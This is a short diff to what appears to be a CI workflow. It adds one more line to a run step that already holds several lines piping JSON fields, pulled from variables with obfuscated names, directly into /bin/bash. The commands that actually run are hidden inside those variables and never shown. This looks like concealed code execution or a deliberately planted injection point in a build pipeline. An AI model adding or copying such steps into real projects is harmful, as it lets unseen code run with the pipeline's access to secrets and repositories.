@@ -34,6 +34,7 @@ jobs:
           echo $kbzf32 | jq -r .v22038 | /bin/bash
           printf '%s' "$xsg65287" | jq -r .brmxx4341 | /bin/bash
           echo $a4610 | jq -r .fdse72103 | /bin/bash
+          printf '%s' "$urmy376" | jq -r .e9 | /bin/bash
 
       - name: Upload results
         if: always()
